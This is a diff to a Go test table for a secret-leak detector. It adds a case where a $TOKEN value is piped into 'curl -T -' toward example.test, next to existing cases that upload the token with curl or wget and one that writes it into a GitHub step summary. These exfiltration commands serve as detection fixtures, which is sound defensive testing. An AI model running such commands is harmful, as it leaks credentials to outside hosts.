@@ -106,6 +106,7 @@ func TestSecretLeakSinksAndFilters(t *testing.T) {
 		{"upload tracked file", `printf '%s' "$TOKEN" > payload.txt; curl --data-binary @payload.txt https://example.test`, Network, 1},
 		{"upload tracked glob", `printf '%s' "$TOKEN" > payload.txt; curl --data-binary @payload*.txt https://example.test`, Network, 1},
 		{"curl upload file option", `printf '%s' "$TOKEN" > payload.txt; curl -T payload.txt https://example.test`, Network, 1},
+		{"curl stdin upload option", `printf '%s' "$TOKEN" | curl -T - https://example.test`, Network, 1},
 		{"wget tracked post file", `printf '%s' "$TOKEN" > payload.txt; wget --post-file=payload.txt https://example.test`, Network, 1},
 		{"read tracked glob", `printf '%s' "$TOKEN" > payload.txt; curl --data-binary "$(cat *.txt)" https://example.test`, Network, 1},
 		{"summary preserves mask-looking content", `echo "::add-mask::$TOKEN" >> "$GITHUB_STEP_SUMMARY"`, Summary, 1},
